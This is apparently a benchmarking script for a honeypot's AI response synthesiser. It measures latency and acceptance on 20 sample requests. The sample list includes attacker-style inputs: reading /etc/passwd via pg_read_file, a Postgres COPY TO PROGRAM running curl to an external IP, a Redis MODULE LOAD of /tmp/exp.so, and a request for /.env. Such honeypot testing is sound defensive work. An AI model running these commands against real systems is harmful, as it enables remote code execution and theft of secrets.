"""Measure AI synthesis (Phase 5A, task 5.8): latency and acceptance rate on 20 fixed sample requests.

    python -m scripts.measure_synthesis --provider fake           pipeline overhead only (offline, no model)
    python -m scripts.measure_synthesis --provider nim             a real model (needs NVIDIA_API_KEY in .env)
    python -m scripts.measure_synthesis --provider nim --model meta/llama-3.1-8b-instruct --timeout 3
    python -m scripts.measure_synthesis --list-models               models your NVIDIA key can use

Only synthetic data is sent: a fixed demo schema (table and column names) and the sample requests below. Each
request runs through the real SynthesisWorker (context builder, hard timeout, validator) against a throwaway
SQLite database. Results go to docs/results/synthesis_<provider>_<date>.csv; a summary is printed.
"""
import argparse
import csv
import statistics
import sys
import tempfile
import uuid
from datetime import UTC, datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))

SCHEMA = {"customers": ["id", "email", "full_name", "status"], "products": ["id", "sku", "title", "price_cents"],
          "orders": ["id", "customer_id", "product_id", "quantity", "created_at"]}
SAMPLES = [  # (proto, request): things the emulators flag `unsupported`
    ("postgres", "select email from customers where email ilike '%admin%' fetch first 3 rows only"),
    ("postgres", "select c.full_name, sum(o.quantity) from customers c join orders o on o.customer_id = c.id group by 1"),
    ("postgres", "select * from pg_stat_activity"),
    ("postgres", "select usename, usesuper from pg_user"),
    ("postgres", "select * from invoices"),
    ("postgres", "show data_directory"),
    ("postgres", "select pg_read_file('/etc/passwd')"),
    ("postgres", "copy customers to program 'curl http://203.0.113.50/x'"),
    ("postgres", "select current_setting('server_version_num')"),
    ("postgres", "select title, price_cents from products order by price_cents desc nulls last limit 3"),
    ("redis", "CLIENT LIST"),
    ("redis", "MEMORY STATS"),
    ("redis", "OBJECT ENCODING session:1"),
    ("redis", "CONFIG GET dir"),
    ("redis", "SCAN 0 MATCH session:* COUNT 100"),
    ("redis", "MODULE LOAD /tmp/exp.so"),
    ("http", "GET /admin/login"),
    ("http", "GET /api/customers/export.csv"),
    ("http", "POST /api/orders/refund"),
    ("http", "GET /.env"),
]


def provider_for(args):
    from app.config import get_settings

    if args.provider == "fake":
        class Fake:  # answers instantly with a valid generic error, to measure the pipeline itself
            name, version, is_model = "fake", "measure", True

            def generate_structured(self, *, system_policy, context, output_schema):
                return {"postgres": {"kind": "error", "code": "42601", "message": "syntax error"},
                        "redis": {"kind": "error", "message": "ERR unknown command"},
                        "http": {"kind": "response", "status": 404, "body": {"error": "not found"}}}[context["protocol"]]
        return Fake()
    from app.ai.nim_provider import NimProvider

    s = get_settings()
    if s.nvidia_api_key is None or not s.nvidia_api_key.get_secret_value():
        sys.exit("NVIDIA_API_KEY is not set in .env")
    return NimProvider(s.nvidia_api_key.get_secret_value(), args.model or s.nim_synth_model, s.nim_base_url,
                       args.timeout, max_tokens=1024, max_retries=0, thinking=args.thinking,
                       guided_json=False)


def list_models() -> None:
    import httpx

    from app.config import get_settings

    s = get_settings()
    if s.nvidia_api_key is None or not s.nvidia_api_key.get_secret_value():
        sys.exit("NVIDIA_API_KEY is not set in .env")
    r = httpx.get(s.nim_base_url.rstrip("/") + "/models", timeout=30,
                  headers={"Authorization": f"Bearer {s.nvidia_api_key.get_secret_value()}"})
    r.raise_for_status()
    for m in sorted(x["id"] for x in r.json().get("data", [])):
        print(m)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--provider", choices=["fake", "nim"], default="fake")
    ap.add_argument("--model", default=None, help="NIM model (default: HORNET_NIM_SYNTH_MODEL)")
    ap.add_argument("--timeout", type=float, default=3.0, help="hard limit per call, seconds")
    ap.add_argument("--thinking", action=argparse.BooleanOptionalAction, default=False,
                    help="let a reasoning model think first (default: off, as in the product)")
    ap.add_argument("--list-models", action="store_true")
    args = ap.parse_args()
    if args.list_models:
        list_models()
        return

    from sqlalchemy import select
    from sqlalchemy.orm import sessionmaker

    import app.immutability  # noqa: F401
    from app.ai.synthesis import SynthesisWorker
    from app.db import Base, make_engine
    from app.models import AiSynthesis, EnvironmentSnapshot, ExecutionRequest, HoneypotSession, VirtualNode

    tmp = Path(tempfile.mkdtemp(prefix="hornet-measure-"))
    engine = make_engine(f"sqlite:///{(tmp / 'measure.db').as_posix()}")
    Base.metadata.create_all(engine)
    sf = sessionmaker(bind=engine, expire_on_commit=False)
    with sf() as db:  # a draft snapshot is enough: nothing here needs publishing
        snap = EnvironmentSnapshot(version=1, status="draft", profile_hash="measure")
        db.add(snap)
        db.flush()
        db.add(VirtualNode(snapshot_id=snap.id, virtual_path="/databases/shop", node_type="database",
                           meta={"tables": dict.fromkeys(SCHEMA, 3), "columns": SCHEMA}))
        sess = HoneypotSession(snapshot_id=snap.id, status="active")
        db.add(sess)
        db.flush()
        req = ExecutionRequest(session_id=sess.id, operation="measure", input_hash="0" * 64)
        db.add(req)
        db.commit()
        snap_id, sess_id, req_id = snap.id, sess.id, req.id

    provider = provider_for(args)
    worker = SynthesisWorker(provider, sf, timeout_s=args.timeout, max_per_session=len(SAMPLES) + 1)
    for proto, text in SAMPLES:
        event = {"service": {"postgres": "db", "redis": "cache"}.get(proto, "web"), "proto": proto,
                 "unsupported": True, **({"action": "sql", "sql": text} if proto == "postgres" else {"action": text})}
        worker.process(sess_id, snap_id, req_id, uuid.uuid4(), event)
    worker.shutdown()

    with sf() as db:
        rows = [r.response_metadata | {"status": r.validation_status} for r in db.scalars(select(AiSynthesis))]
    out_dir = ROOT / "docs" / "results"
    out_dir.mkdir(parents=True, exist_ok=True)
    model_name = getattr(provider, "model", None) or "fake"  # the model actually used (from --model or .env)
    label = args.provider if args.provider == "fake" else (
        f"nim-{model_name.replace('/', '_')}" + ("-thinking" if args.thinking else ""))
    out = out_dir / f"synthesis_{label}_{datetime.now(UTC):%Y-%m-%d}.csv"  # one file per model and day: history kept
    with out.open("w", newline="", encoding="utf-8") as fh:
        w = csv.writer(fh, lineterminator="\n")
        w.writerow(["proto", "request", "status", "reason", "latency_ms", "provider"])
        for r in rows:
            w.writerow([r["proto"], r["request"], r["status"], r["reason"], r["latency_ms"], r["provider"]])

    lat = sorted(r["latency_ms"] for r in rows)
    counts = {s: sum(r["status"] == s for r in rows) for s in ("accepted", "rejected", "timeout", "fallback")}
    p95 = lat[min(len(lat) - 1, round(0.95 * (len(lat) - 1)))]
    print(f"provider={rows[0]['provider']} timeout={args.timeout}s requests={len(rows)}")
    print(f"latency ms: median={statistics.median(lat):.0f} p95={p95} max={lat[-1]}")
    print("statuses: " + ", ".join(f"{k}={v}" for k, v in counts.items()))
    print(f"written: {out.relative_to(ROOT)}")


if __name__ == "__main__":
    main()
